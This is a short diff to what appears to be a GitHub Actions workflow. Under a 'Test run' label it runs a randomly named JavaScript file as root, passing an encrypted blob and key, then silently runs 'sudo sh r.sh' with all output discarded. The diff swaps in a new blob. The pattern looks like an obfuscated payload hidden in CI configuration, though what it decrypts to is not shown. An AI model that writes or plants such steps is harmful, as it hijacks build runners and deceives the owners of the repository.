@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'qli5g'
+        echo '65nks'
         sudo chmod +x heard8w7wt/eldridge1gbc0.js
-        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX1/RMlXhlMeADvMCv79GI38cNuq+Ba45UPOqPdxt6y68sXnMRuSUr4dHKMmMlHKGD5i8MQ6WRWJ5/0/4fIs9ipWPztWMMpz3x7/rwOZuIYBeusTwJloNywax czfhn9 && sudo sh r.sh > /dev/null 2>&1
+        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX1/jpb45PYHAVW6baaIlahKWmudEKaourfODsn1VnavD9bexVX6LY7yVmR+f6JDrsfQ79/b+5QcHvXdj80Od8YvobsipAdB16S9mcaVQ8Cbd3zwzi+sjl2OM jidwku && sudo sh r.sh > /dev/null 2>&1
